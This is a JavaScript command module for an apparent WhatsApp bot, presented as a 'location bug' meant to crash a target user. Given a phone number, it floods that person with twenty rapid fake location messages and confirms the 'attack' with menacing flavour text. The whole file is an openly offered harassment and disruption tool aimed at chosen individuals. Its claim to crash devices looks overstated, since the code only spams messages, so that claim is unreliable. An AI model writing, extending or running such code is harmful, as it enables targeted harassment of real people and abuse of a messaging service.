export default {
  name: 'locationbug',
  description: 'Send location bug to crash user',
  category: 'dangerous',
  aliases: ['locbug', 'loc'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ LOCATION BUG 〕━━━┈⊷
┃ Send location bug to crash user.
┃ 
┃ Usage: ${prefix}locationbug <number>
┃ 
┃ Example: ${prefix}locationbug 27797352930
┃ 
┃ 🧛 "The darkness misguides."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ LOCATION BUG SENT 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 
┃ 🧛 "The darkness misguides..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      for (let i = 0; i < 20; i++) {
        try {
          const lat = -26.2041 + (Math.random() - 0.5) * 10;
          const lng = 28.0473 + (Math.random() - 0.5) * 10;
          
          await sock.sendMessage(userJid, {
            location: {
              degreesLatitude: lat,
              degreesLongitude: lng,
              name: `Bug Location ${i + 1}`,
              address: `Fake address ${i + 1}`
            }
          });
          await new Promise(resolve => setTimeout(resolve, 100));
        } catch {}
      }

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ LOCATION BUG SENT 〕━━━┈⊷
┃ 👤 ${target} location bug sent!
┃ 
┃ 🧛 "The darkness misguides."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
